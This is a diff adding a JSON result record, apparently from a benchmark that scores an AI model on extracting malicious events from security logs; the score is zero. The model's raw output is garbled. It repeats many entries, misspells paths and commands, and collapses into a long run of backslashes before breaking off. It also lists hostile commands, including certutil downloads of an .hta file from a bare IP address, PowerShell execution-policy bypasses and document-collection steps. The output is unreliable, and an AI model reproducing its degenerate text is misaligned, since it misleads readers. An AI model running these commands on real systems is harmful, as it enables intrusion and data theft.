@@ -1,0 +1,44 @@
+{
+  "output": {
+    "malicious_events": [],
+    "narrative": "",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 58734,
+      "completion_tokens": 1536,
+      "total_tokens": 60270,
+      "wall_clock_s": 41.436,
+      "parse_retries": 1
+    },
+    "_raw_text": "{ \n  \"malicious_events\": [\n    {\"command\": \"certutil -urlcache -split -f http://example.com/x.exe C:\\\\\\\\\\\\x.exe\", \"stage\": \"Defense Evasion\"}, \n    {\"command\": \"certutil -urlcache -split -f  http://124.223.85.207:8082/Test.hta\", \"stage\": \"Defense Evasion\"},\n    {\"command\": \"certutil.exe -decode a.txt b.txt\", \"stage\": \"Defense Evasion\"},\n    {\"command\": \"C:\\\\\\\\\\\\AtomicRedTeam\\\\atomics\\\\T1548.002\\\\src\\\\T1548.002.bat\", \"stage\": \"Privilege Escalation\"},  \n    {\"command\": \"C:\\\\\\\\\\\\\\\\AtomicRedTeam\\\\atomics\\\\T1548.002\\\\src\\\\T1548.002.bat\", \"stage\": \"Privilege Escalation\"},  \n    {\"command\": \"C:\\\\\\\\Atomsredteam\\\\atoms\\\\T1059.005\\\\src\\\\sys_info.vbs\", \"stage\": \"Collection\"},  \n    {\"command\": \"C:\\\\\\\\\\\\\\\\path\\\\to\\\\atomic_red_team\\\\src\\\\sys_info.vbs\", \"stage\": \"Collection\"},\n    {\"command\": \"C:\\\\\\\\\\\\\\tmp\\\\T1059.005\\\\out.txt\", \"stage\": \"Collection\"},\n    {\"command\": \"C:\\\\\\\\\\\\\\\\Path\\\\To\\\\atomic_red_team\\\\src\\\\T1059.005\\\\out.txt\", \"stage\": \"Collection\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C .\\\\chromeRemoteServices.ps1\", \"stage\": \"Command and Control\"}, \n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C .\\\\chromeRemoteServices.ps1\", \"stage\": \"Command and Control\"},\n    {\"command\": \"C:\\\\\\\\\\\\\\tmp\\\\chromeRemoteServices.ps1\", \"stage\": \"Command and Control\"},\n    {\"command\": \"C:\\\\\\\\\\\\\\\\Path\\\\To\\\\atomic_red_team\\\\src\\\\chromeRemoteServices.ps1\", \"stage\": \"Command and Control\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1548.002 -TestNumbers 2\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1548.002 -TestNumbers 2\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003 \", \"stage\": \"Discovery\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003 \", \"stage\": \"Discovery\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1059.003 \", \"stage\": \"Discovery\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1059.003 \", \"stage\": \"Discovery\"},\n    {\"command\": \"C:\\\\\\\\path\\\\to\\\\atomic_red_team\\\\src\\\\T1059.003\\\\script.bat\", \"stage\": \"Discovery\"},\n    {\"command\": \"C:\\\\\\\\\\\\\\\\path\\\\to\\\\atomic_red_team\\\\src\\\\T1059.003\\\\script.bat\", \"stage\": \"Discovery\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1220  -TestNumbers 1\", \"stage\": \"Discovery\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1220  -TestNumbers 1\", \"stage\": \"Discovery\"},\n    {\"command\": \"C:\\\\\\\\\\temp\\\\T1220_command_prompt_collection>\\\\nul && dir c:\\\\\\\\b\\\\\\\\s\\\\.docx|findstr /e .docx\", \"stage\": \"Collection\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Copy-Item '.\\\\msxsl.exe' '\\\\\\\\C:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\msxsl.exe'\", \"stage\": \"Persistence\"},  \n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Invok-AtomicTest T1059.005\", \"stage\": \"Collection\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C .\\\\T1059.005\\\\src\\\\sys_info.vbs\", \"stage\": \"Collection\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C .\\\\T1059.005\\\\src\\\\sys_info.vbs\", \"stage\": \"Collection\"}, \n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C .\\\\T1059.005\\\\src\\\\sys_info.vbs\", \"stage\": \"Collection\"},\n    {\"command\": \"C:\\\\\\\\\\\\\\\\\\temp\\\\T1059.005\\\\out.txt\", \"stage\": \"Collection\"},\n    {\"command\": \"C:\\\\\\\\\\\\\\\\\\temp\\\\T1220_1.txt\", \"stage\": \"Collection\"},\n    {\"command\": \"C:\\\\\\\\\\\\\\\\\\temp\\\\T1220_2.txt\", \"stage\": \"Collection\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C new-item -path \\\"$env:temp\\\\T1220_powershell_collection\\\" -force -type directory\", \"stage\": \"Discovery\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C get-childitem -recurse -include *\\\\.doc\\\\\\\\\\\\\\\\\\\\\\\\||| copy-item $.fullnam\\\\\\\\\\\\\\\\\\\\\\\\e\\\\$env:tem\\\\\\\\\\\\\\\\\\\\\\\\p\\\\\\\\\\\\\\\\\\\\\\\\p\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 0,
+      "fn": 37
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 0,
+      "fn": 37,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 58734,
+      "completion_tokens": 1536,
+      "total_tokens": 60270,
+      "wall_clock_s": 41.436,
+      "parse_retries": 1
+    }
+  }
+}
